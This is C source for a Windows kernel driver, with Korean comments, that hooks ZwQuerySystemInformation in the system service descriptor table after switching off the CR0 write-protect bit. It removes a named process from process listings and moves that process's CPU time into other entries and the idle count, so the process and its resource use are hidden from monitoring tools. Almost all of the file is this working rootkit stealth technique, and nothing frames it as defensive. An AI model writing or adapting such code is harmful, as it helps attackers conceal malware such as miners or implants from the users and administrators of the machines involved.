#include "ssdt.h"
#include <stdlib.h>
#include <wchar.h>


BOOLEAN statHook = FALSE;


//LPWSTR cp_procNAme = NULL;
LPSTR p_procName = NULL;
LPWSTR wp_procName = NULL;
NTSTATUS NewZwQuerySystemInformation(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength)
{
	NTSTATUS ntStatus;
	ntStatus = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation)) (
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);
	if (NT_SUCCESS(ntStatus))
	{
		if (SystemInformationClass == 5)
		{

			struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;
			struct _SYSTEM_PROCESSES *prev = NULL;


			while (curr)
			{
				if (curr->ProcessName.Buffer != NULL)
				{
					if (0 == memcmp(curr->ProcessName.Buffer, wp_procName, sizeof(curr->ProcessName)))
					{
						DbgPrintEx(DPFLTR_ACPI_ID, 0, "Find Proc\n");
						//사용량 동기화
						m_UserTime.QuadPart += curr->UserTime.QuadPart;
						m_KernelTime.QuadPart += curr->KernelTime.QuadPart;

						//이전 리스트 멤버가 있으면
						if (prev)
						{
							//다음 리스트 멤버가 있으면
							if (curr->NextEntryDelta)
								prev->NextEntryDelta += curr->NextEntryDelta;
							else
								//없으면 NULL
								prev->NextEntryDelta = 0;
						}
						//이전 리스트 멤버가 없으면(cur이 첫멤버일 경우)
						else
						{
							if (curr->NextEntryDelta)
							{
								(char *)SystemInformation += curr->NextEntryDelta;
							}
							else
								SystemInformation = NULL;
						}
					}
				}
				else
				{
					curr->UserTime.QuadPart += m_UserTime.QuadPart;
					curr->KernelTime.QuadPart += m_KernelTime.QuadPart;

					m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
				}
				prev = curr;
				if (curr->NextEntryDelta) ((char *)curr += curr->NextEntryDelta);
				else curr = NULL;
			}
		}
		else if (SystemInformationClass == 8)
		{
			struct _SYSTEM_PROCESSOR_TIMES * times = (struct _SYSTEM_PROCESSOR_TIMES *)SystemInformation;
			times->IdleTime.QuadPart += m_UserTime.QuadPart + m_KernelTime.QuadPart;
		}
	}
	return ntStatus;
}

VOID WP_OFF()
{
	__asm {
		push eax
		mov eax, CR0
		and eax, 0x0FFFEFFFF
		mov CR0, eax
		pop eax
	}
}

VOID WP_ON()
{
	__asm {
		push eax
		mov eax, CR0
		or eax, NOT 0x0FFFEFFFF
		mov CR0, eax
		pop eax
	}
}

VOID unHookSSDT()
{
	// unhook system calls
	WP_OFF();
	DbgPrintEx(DPFLTR_ACPI_ID, 0, "zw:%x\nold:%x\nnew:%x\n", ZwQuerySystemInformation, OldZwQuerySystemInformation, NewZwQuerySystemInformation);
	UNHOOK_SYSCALL(ZwQuerySystemInformation, OldZwQuerySystemInformation);
	WP_ON();
}


NTSTATUS hookSSDT()
{
	m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;

	OldZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation));

	WP_OFF();
	// hook system calls
	HOOK_SYSCALL(ZwQuerySystemInformation, NewZwQuerySystemInformation, OldZwQuerySystemInformation);

	DbgPrintEx(DPFLTR_ACPI_ID, 0, "zw:%x\nold:%x\nnew:%x\n", ZwQuerySystemInformation, OldZwQuerySystemInformation, NewZwQuerySystemInformation);
	WP_ON();
	return STATUS_SUCCESS;
}
